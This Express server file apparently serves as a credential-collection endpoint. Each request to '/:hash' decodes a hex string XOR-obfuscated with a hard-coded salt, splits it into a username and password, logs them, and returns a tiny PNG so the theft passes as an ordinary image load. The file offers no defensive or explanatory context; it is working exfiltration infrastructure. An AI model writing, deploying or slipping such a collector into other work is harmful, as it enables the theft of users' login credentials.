const express = require('express')
const app = express()
var cors = require('cors')

const port = process.env.PORT ?? 3000

const image = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAC/ElEQVQ4y22Tz2tcVRTHP/e9e9+PmcnUpJ042himpgyijZ1UBIUSMQbppqVUHaRdxiYbpQvrpv9AkayqIKSxS4MkFQUFK4QBK7hRQ0Owpm1sh0nQMaaTtJnJm5l337suNKGVflfnwOFwzvmej+B/erV4ojB8qjiWf6EwZEuVA0OkdfnW3HxpdmpmovT55WsP1ovt4PHep/yzn358oe/ggRGBsHiEDCa+s3D90vg7756plivBToPu3h7//NczV7qy3YMAjrAwQGhiAJSwEED7v3x99e+r544Wj1TLlUAAjH/35cX9hedPA2SdBFEY4ipFUjoEOmSz3SLjJ/kjqFMnAuD2wq+T7w8fG5WvvHm80FfoH9mZM4opt+p04rNbR3hSsR6HrAf3yAiHzVgjhODp/mdHht5+4xM5fPKtsQd3TtiS5zr2kLYVfwZ1tIkZSGfY0C1iHRFFAVLYgLBeO1kcE9OV324o18krYfGk9MEY1toBK8EmnckUAClbYUUxe5SP5yiu12sgBDoMb0rpODmAfV4HP66tcLAri4lj0n6CXi9FU2tWdZP9fpqlezWUdsjaHtW4hVQyJ8HsuJlULgCeVDRMiAHuBg1QNhjwpCQCmjoECzACqdvtsnLd/J3mJgOPdUNsaIgWRscsN+ugbFK24vb9Gn0dXTR0m8VgnbTno3VYlos/zZX6D7+cD03M4tYG+5wUnY5PLrGLWtjEGOhULsuRoR62WGreJ+35ANz85VpJzk5NTxw4/NLothPNSFNpN0hKRa+boh1F/HB3hV1+gq4YPKW2DYtnP5ueEAAffvvFxfyhws4jpSyJEbARbJF2fWzLQlkW82tVHP/fOy3NL0x+8PrxUQGQ6dnrn/9m+sruJ7KDAJaBetjClQrbshDGsBWGuEpiCYtadfXquaPFI39VloMdmDI9e/2zkx9dyA8URhA8GiZj4t/nFy6Nn37vzGplJXiIxm0NnjhWGD5VHHvmxUNDynFyBtDtsHzj57nS7NTMxPeXv3oI538A3FQ3FhY2xOAAAAAASUVORK5CYII="

app.use(cors())

app.get('/:hash', (req, res) => {
    const deciphered = decipher('123')(req.params.hash)

    const [username, password] = deciphered.split(" | ")

    console.log({ username, password })
    
    res.set({
        'content-type': "image/png"
    })

    res.send(image)
})

const decipher = salt => {
    const textToChars = text => text.split('').map(c => c.charCodeAt(0));
    const applySaltToChar = code => textToChars(salt).reduce((a,b) => a ^ b, code);
    return encoded => encoded.match(/.{1,2}/g)
        .map(hex => parseInt(hex, 16))
        .map(applySaltToChar)
        .map(charCode => String.fromCharCode(charCode))
        .join('');
}

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})